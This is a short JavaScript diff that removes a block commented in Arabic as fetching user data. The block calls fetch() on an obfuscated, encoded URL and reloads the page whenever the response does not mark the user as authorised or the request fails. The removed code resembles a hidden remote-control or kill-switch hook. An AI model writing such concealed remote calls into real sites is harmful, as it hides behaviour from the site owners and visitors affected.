@@ -225,15 +225,3 @@ function closeAllPopups() {
 if (someCondition) {
     window.location.reload();
 }
-
-// جلب بيانات المستخدم والتحقق من الحالة
-fetch(loginOpen('Xiv0Zia6md9gY2hzYB1qXNK4TRynWLPwSRPghH1dhLvBmwWzZwPBSRrEXQ8oS29nm2WzZwPBSRrENL9xXQ4oXxrpYV='))
-    .then(response => response.json())
-    .then(data => {
-        if (!data.user || data.user[contentIdentifier] !== true) {
-            window.location.reload();
-        }
-    })
-    .catch(error => {
-        window.location.reload();
-    });
